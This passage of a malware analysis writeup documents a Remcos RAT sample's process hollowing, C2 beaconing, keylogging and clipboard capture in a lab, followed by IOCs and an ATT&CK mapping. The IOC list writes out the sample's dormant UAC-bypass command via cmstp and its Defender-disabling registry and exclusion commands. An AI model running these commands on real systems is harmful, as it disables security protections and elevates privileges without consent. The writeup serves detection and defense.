| Service control | `OpenSCManager`, `StartService`, `ChangeServiceConfig` |
| Download & execute | `URLDownloadToFileW`, `InternetOpenUrlW`, `InternetReadFile` |
| Network | raw Winsock (`socket`, `connect`, `send`, `recv`, `gethostbyname`) |

`IsDebuggerPresent` is imported but is most likely CRT-related; I did not confirm it as an anti-debug check.

## Dynamic Analysis

Lab: VirtualBox Windows 10 x64 (19045), host-only networking, FakeNet-NG 3.5, Process Hacker, Procmon. Clean snapshot taken before execution, restored after. VM audio input, webcam and shared clipboard all disabled before the run.

Everything in this section is a **confirmation of what the static analysis predicted**, which is exactly what dynamic analysis is for.

### Process hollowing, live

After launching the sample, Process Hacker showed **one** process, not two. The parent (PID 4040) read its own resources, injected, and exited, leaving the child (PID 1504) with the same executable name and, in the General tab, **`Parent: Non-existent process`**.

The memory map is where it becomes obvious:

```
0x400000   Private: Commit   508 kB   RWX   (Use: empty)
```

`0x400000` is the standard image base for a 32-bit executable. In a normal process that region is type **Image**, backed by the file on disk. Here it is **Private**, memory allocated by hand, and marked **RWX**, which is `PAGE_EXECUTE_READWRITE`, the exact protection the loader passes to `VirtualAllocEx`. 508 kB matches the size of Remcos in memory.

Opening that region: **`MZ`**. A PE mapped manually over the top of a legitimate image. That is process hollowing, confirmed end to end.

![MZ header inside the hollowed process memory](/assets/img/remcos/12-ph-injected-mz.png)
*Figure 11. The `MZ` header at `0x400000` inside the hollowed process, a manually mapped PE where the legitimate image used to be.*

### Mutex

Process Hacker's handle list, type Mutant:

```
\Sessions\1\BaseNamedObjects\Rmc-9H4U4V
```

Exactly the mutex name from the decrypted config. Remcos creates it at startup and exits if it already exists, so the host is not infected twice. For defenders that makes it a high-confidence host IOC.

![Rmc-9H4U4V mutex in Process Hacker](/assets/img/remcos/13-ph-mutex.png)
*Figure 12. The `Rmc-9H4U4V` mutant handle, matching the name recovered statically from the `SETTINGS` resource.*

### C2 and TLS

FakeNet, repeating roughly once per second:

```
[DNS Server] Received A request for domain 'onetouchfromlifeto.ddns.net' from svchost.exe (2160)
[Diverter]   9121ef0f...exe (1504) requested TCP 192.0.2.123:4489
...
File "ssl.py", line 1342, in do_handshake
ssl.SSLZeroReturnError: TLS/SSL connection has been closed (EOF)
```

Three things to read out of that.

The DNS query comes from **`svchost.exe`**, not from the malware, because Windows resolves names through the DNS Client service. The connection itself comes from PID 1504, the hollowed process, to the domain and port from the config.

The handshake failure is itself the confirmation of the `:1` TLS flag. FakeNet detects TLS and answers with its own certificate; Remcos **closes the connection**. The most likely explanation is certificate pinning against the embedded ECDSA certificates found in the config. That is likely, but not proven here.

And the retry rate, about one connection attempt per second, is aggressive beaconing, useful as a network detection signal in its own right.

![FakeNet capturing DNS and C2 connection attempts](/assets/img/remcos/14-fakenet-c2.png)
*Figure 13. DNS resolution of the C2 domain via the Windows DNS Client service, followed by the hollowed process connecting to port 4489.*

### The keylogger, and the part that made me stop

Procmon showed PID 1504 opening and writing to `C:\ProgramData\remcos\logs.dat` every five seconds, with `CreateFile` on `C:\ProgramData\remcos` returning `NAME COLLISION` because the directory already existed.

I opened the file. It is **plaintext**:

```
[2026/10/08 13:31:37 Offline Keylogger Started]

[Process Hacker [DESKTOP-...]]
[BckSp][BckSp]121[Win]t
[Search]
[Esc]
...
{ User has been idle for 2 minutes }
...
[Text copied to clipboard]
11-ph-hollowing-rwx.png
[End of clipboard]
```

Four separate capabilities in one log:

- **Keystrokes**, including special keys (`[Ctrl+A]`, `[Win]`, `[BckSp]`)
- **Active window titles**, so the operator knows *where* you were typing, not just what
- **Idle time**, useful for an operator deciding when nobody is watching the screen
- **The clipboard**, dumped in full

"Offline Keylogger Started" is the detail that matters operationally: with no C2 reachable, it logs locally and accumulates, ready to ship everything as soon as the connection comes up. Air-gapping the VM does not stop the collection, it only delays the exfiltration.

And then the part I did not plan for. The clipboard entries in that log are **the filenames of the screenshots I was saving for this writeup**, plus a chunk of FakeNet log I had copied. While I was documenting the infection, the malware was logging my documentation.

In a lab that is a funny anecdote. On a real machine, think about what actually goes through the clipboard: passwords copied out of a password manager, recovery codes, wallet seed phrases, API keys. The keylogger gets all of it without the user ever typing a character.

![Plaintext keylog content](/assets/img/remcos/16-keylog-plaintext.png)
*Figure 14. `logs.dat` in plaintext: keystrokes with special keys expanded, active window titles, and idle-time markers.*

![Clipboard capture in the keylog](/assets/img/remcos/17-keylog-clipboard.png)
*Figure 15. Clipboard capture in action: the filenames of the screenshots taken for this analysis, logged by the malware as they were copied.*

### Persistence: what did *not* happen

Filtering Procmon for `RegSetValue` by the malware over the whole run returned exactly **two** events:

```
HKCU\SOFTWARE\Rmc-9H4U4V\exepath   REG_BINARY
HKCU\SOFTWARE\Rmc-9H4U4V\licence   REG_SZ
```

Remcos creates a registry key named after its own mutex and stores its path and licence there, another good host IOC.

But **no Run key was written, and `remcos.exe` was never dropped**. The `persist_run_keys` function exists in the binary; the config flags that gate it are off in this build. This infection does not survive a reboot.

That is a useful reminder when writing up a sample: the code tells you what the family can do, the config tells you what this build does. Reporting "Remcos establishes Run-key persistence" would be true of the family and false of this sample.

![The only two registry writes performed by the sample](/assets/img/remcos/18-procmon-registry.png)
*Figure 16. Two `RegSetValue` events in the entire run, and neither of them is a Run key.*

## Indicators of Compromise (IOCs)

Hashes

```
SHA256  9121ef0f2d7b2cc3c887420ecb1eae214db9cb780433d11565ab8c98a6ad99ec  (stage 1, delivered file)
SHA256  CB32DBA898ACC1B7559D4518A688D37369292B5E816F9F83A5AC00BEDC682CB2  (stage 2, AdvancedSokoban.dll)
SHA256  C63715B4FB067CD4E140BA9F8F60ECA23E64DE53F4B0D3920D3F53816BF0E609  (stage 3, Noogen.Validation.dll)
SHA256  3EF4C8A3489CCAEE1C746255871EFDD54CC762EA99A288B7665E9D5DA0119ADA  (stage 4, Remcos 3.8.0 Pro)
```

Network

```
C2 domain   onetouchfromlifeto[.]ddns[.]net
C2 port     4489/TCP (TLS)
Provider    ddns.net (No-IP dynamic DNS)
Botnet ID   ONETOUCH
Behaviour   connection retry roughly every 1 second
```

Host artefacts

```
Mutex             Rmc-9H4U4V
Registry          HKCU\SOFTWARE\Rmc-9H4U4V\exepath   (REG_BINARY)
Registry          HKCU\SOFTWARE\Rmc-9H4U4V\licence   (REG_SZ)
Keylog file       C:\ProgramData\remcos\logs.dat     (plaintext)
Directory         C:\ProgramData\remcos\
Memory            RWX Private region at 0x400000 containing an MZ header, in a process whose parent no longer exists
```

Artefacts present in code but **not active** in this build

```
Install filename  remcos.exe
Run keys          HKCU\...\CurrentVersion\Run\ , HKLM\...\CurrentVersion\Run\ ,
                  HKLM\...\CurrentVersion\Policies\Explorer\Run\
Loader mutex      VDSAljtEwsSW
UAC bypass        C:\Windows\Temp\<random>.inf  + cmstp.exe /au <inf>  (window title "LordVPN")
Defender          HKLM\SOFTWARE\Policies\Microsoft\Windows Defender  DisableAntiSpyware = 1
Defender          powershell "Add-MpPreference -ExclusionPath <path>"
```

Crypter artefacts (useful for hunting other samples from the same builder)

```
Stage 1 assembly / decoy   uUyi 1.0.0.0 / QuanLyThuVienCaNhan
Stage 1 assembly GUID      f9b36259-630b-4999-8d7c-56a9dea36011
Stage 2 assembly / decoy   AdvancedSokoban 7.4.8.0 / "PuzzleVault Studios"
Stage 2 assembly GUID      A7E9D8C6-5F4B-4A3D-9F2C-8B1A7E6D5F4C
Stage 3 assembly           Noogen.Validation 12.7.5.0
Stego resources            "Qi" (stage 2 carrier), "xsam" (stage 3 carrier)
Payload resource           "zByp" (Remcos, raw encrypted byte[])
Stage 3 XOR key            gdi        (BigEndianUnicode)
Stage 4 XOR key            cXpEBNZbNrckf  (ASCII)
Hex separator in stage 1   526164696F ("Radio")
```

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Defense Evasion | Obfuscated Files or Information: Steganography | T1027.003 |
| Defense Evasion | Obfuscated Files or Information: Software Packing | T1027.002 |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 |
| Defense Evasion | Reflective Code Loading | T1620 |
| Defense Evasion | Process Injection: Process Hollowing | T1055.012 |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based Evasion | T1497.003 |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 (present, disabled in this config) |
| Defense Evasion | System Binary Proxy Execution: CMSTP | T1218.003 (present, disabled in this config) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 (present, disabled in this config) |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 (code present, not active in this build) |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 (present, disabled in this config) |
| Execution | Native API | T1106 |
| Discovery | Application Window Discovery | T1010 |
| Discovery | System Owner/User Discovery | T1033 |
| Credential Access | Input Capture: Keylogging | T1056.001 |
| Collection | Clipboard Data | T1115 |
| Collection | Screen Capture | T1113 (import-level evidence) |
| Collection | Audio Capture | T1123 (import-level evidence) |
| Collection | Data from Local System | T1005 |
| Command and Control | Application Layer Protocol | T1071 |
| Command and Control | Encrypted Channel: Asymmetric Cryptography (TLS) | T1573.002 |
| Command and Control | Dynamic Resolution | T1568 |
| Command and Control | Ingress Tool Transfer | T1105 (present, disabled in this config) |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

## Anti-Analysis Summary

| Technique | Present | Notes |
|---|---|---|
| Multi-stage packing | Yes | 3 loader stages before the payload, each with a different unpacking scheme |
| Steganography | Yes | stages 2 and 3 hidden in image pixels (RGB 3 bytes/px, then ARGB 4 bytes/px) |
| Decoy padding in carrier image | Yes | 177 columns + 225 rows cropped away before extraction |
| Decoy application identities | Yes | Vietnamese library app, puzzle game, validation library |
| Malicious code inside legitimate code | Yes | first line of `InitializeComponent` / of a constructor |
| Commercial obfuscators | Yes | SmartAssembly 8.3.7 (stage 2), .NET Reactor 6.x (stage 3) |
| Reflection to hide API names | Yes | `typeof(Assembly).InvokeMember("Load", ...)` |
| Runtime API resolution | Yes | `LoadLibraryA` + `GetProcAddress` + `GetDelegateForFunctionPointer` for all hollowing APIs |
| Junk code | Yes | `ComputeChessEngineMetrics` (~280 lines, result unused) |
| Control-flow flattening | Yes | stego extractor as `Action[]` state machine; .NET Reactor control flow |
| Time-based sandbox evasion | Yes | 5-second sleep before the payload path (plus optional configurable sleep) |
| Fileless payload loading | Yes | `Assembly.Load(byte[])`, payload never written to disk |
| Process hollowing | Yes | into a new instance of its own host exe in this build |
| Anti-debug | No | NETReactorSlayer found no anti-debugger method; `IsDebuggerPresent` in stage 4 likely CRT |
| Anti-tamper | No | NETReactorSlayer found no anti-tamper method |
| Anti-VM / anti-sandbox checks | No | ran fully in VirtualBox with no evasion beyond the sleep |
| UAC bypass | Partial | cmstp implementation present, disabled by config |
| Defender tampering | Partial | registry disable + exclusion path present, disabled by config |
| Persistence | Partial | Run-key code present, disabled by config, no reboot survival |

The interesting shape here: **the packing is sophisticated, the anti-analysis is not**. No anti-debug, no anti-VM, no anti-tamper. The crypter author invested everything in making the payload hard to *find* and nothing in making it hard to *watch*. For an analyst that is good news: once you are through the layers, the sample runs happily in a VM and tells you everything.

## Analysis Environment and Methodology

Static analysis was done with Detect It Easy for triage, **dnSpy** for all three .NET stages, and **IDA Pro** for the native Remcos payload. Deobfuscation used **de4dot-cex** (`-p un` generic profile, after the SmartAssembly profile crashed in the string decrypter) for stage 2 and **NETReactorSlayer** for stage 3. All payload extraction and decryption was reimplemented in **PowerShell**, deliberately using the same `System.Drawing` APIs the malware itself uses, so the output is identical by construction rather than by approximation.

Every payload in this writeup was obtained **statically**. The malware was not executed until the chain was fully unpacked and understood; the dynamic run existed only to confirm conclusions already reached from the code.

Dynamic analysis ran in an isolated VirtualBox Windows 10 VM on host-only networking, with **FakeNet-NG** for network containment, **Process Hacker** for process and memory inspection, and **Procmon** for file and registry activity. A clean snapshot was taken before execution and restored afterwards. VM audio input, webcam and shared clipboard were disabled before the run, and given what the clipboard capture turned up, that last one was worth doing.

A note on the IDA figures: the Remcos payload ships with no symbols, so every function starts as `sub_XXXXXXXX`. The readable names in the screenshots (`decrypt_settings_config`, `rc4_ksa`, `rc4_crypt`, `keylogger_install_hook`, `persist_run_keys`, `print_version_banner`) are my own annotations, applied as I identified each function. The figures show the binary after the work, not how it looked when first loaded.

Where this writeup says a field name or a behaviour is **inferred**, it means exactly that: the Remcos config index mapping, the purpose of the `7812` builder value, the certificate-pinning explanation for the failed TLS handshake, and the capabilities backed only by import-level evidence were not proven in code. Everything else was verified either in the disassembly or at runtime.

Sample obtained from MalwareBazaar (signature RemcosRAT, first seen 2026-10-02).
